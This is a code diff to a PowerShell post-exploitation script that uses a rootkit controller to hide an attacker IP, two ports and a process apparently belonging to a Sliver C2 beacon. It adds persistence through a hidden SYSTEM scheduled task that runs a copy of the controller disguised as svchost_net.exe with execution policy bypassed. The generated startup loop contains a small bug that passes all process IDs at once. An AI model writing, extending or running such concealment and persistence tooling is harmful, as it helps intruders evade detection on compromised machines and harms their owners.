@@ -118,9 +118,10 @@ if (-not (Test-Path "NetRootKitController.exe")) {
     exit
 }
 
-# The IP the user requested to hide any traffic for
+# The IP, Ports, and Process the user requested to hide
 $TargetIP = "10.2.0.144"
 $PortsToHide = @("8888", "8081")
+$ProcessToHide = "sliver"  # Change this to whatever your beacon name is!
 
 Write-Host "[*] Checking connection to driver..."
 .\NetRootKitController.exe check-connection "Ping"
@@ -135,7 +136,19 @@ foreach ($Port in $PortsToHide) {
     Write-Host $hideOut2
 }
 
-Write-Host "[*] Creating Scheduled Task to persist IP and Port hiding across reboots..."
+Write-Host "[*] Attempting to find and hide process: $ProcessToHide..."
+$targetProcs = Get-Process -Name $ProcessToHide -ErrorAction SilentlyContinue
+if ($targetProcs) {
+    foreach ($p in $targetProcs) {
+        Write-Host "    -> Hiding PID: $($p.Id)"
+        $hideOut3 = .\NetRootKitController.exe hide-pid $($p.Id)
+        Write-Host $hideOut3
+    }
+} else {
+    Write-Host "    -> Process not found currently running. Skipping."
+}
+
+Write-Host "[*] Creating Scheduled Task to persist IP, Port, and Process hiding across reboots..."
 # Copy the controller somewhere safe where it won't be deleted so the scheduled task can find it
 $PersistDir = "C:\Windows\System32\Tasks\NRK"
 if (-not (Test-Path $PersistDir)) {
@@ -144,20 +157,27 @@ if (-not (Test-Path $PersistDir)) {
 }
 Copy-Item ".\NetRootKitController.exe" -Destination "$PersistDir\svchost_net.exe" -Force
 
-# Create a batch file to run multiple controller commands sequentially on startup
-$BatPath = "$PersistDir\UpdateNetwork.bat"
-$BatContent = @"
-@echo off
-timeout /t 5 /nobreak >nul
-cd /d "%~dp0"
-svchost_net.exe hide-remote-ip $TargetIP
-svchost_net.exe hide-ip 8888
-svchost_net.exe hide-ip 8081
-"@
-Set-Content -Path $BatPath -Value $BatContent
+# Create a powershell script to run multiple controller commands sequentially on startup
+# (Changed from .bat to .ps1 so we can dynamically calculate the PID every reboot)
+$PSPath = "$PersistDir\UpdateNetwork.ps1"
+$PSContent = @"
+Start-Sleep -Seconds 10
+cd "$PersistDir"
+.\svchost_net.exe hide-remote-ip $TargetIP
+.\svchost_net.exe hide-ip 8888
+.\svchost_net.exe hide-ip 8081
 
-# Create a scheduled task that runs as SYSTEM on startup to re-apply the IP/Port hiding batch file
-$Action = New-ScheduledTaskAction -Execute "$BatPath"
+`$procs = Get-Process -Name "$ProcessToHide" -ErrorAction SilentlyContinue
+if (`$procs) {
+    foreach (`$p in `$procs) {
+        .\svchost_net.exe hide-pid `$procs.Id
+    }
+}
+"@
+Set-Content -Path $PSPath -Value $PSContent
+
+# Create a scheduled task that runs as SYSTEM on startup to re-apply the IP/Port hiding script
+$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSPath`""
 $Trigger = New-ScheduledTaskTrigger -AtStartup
 $Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
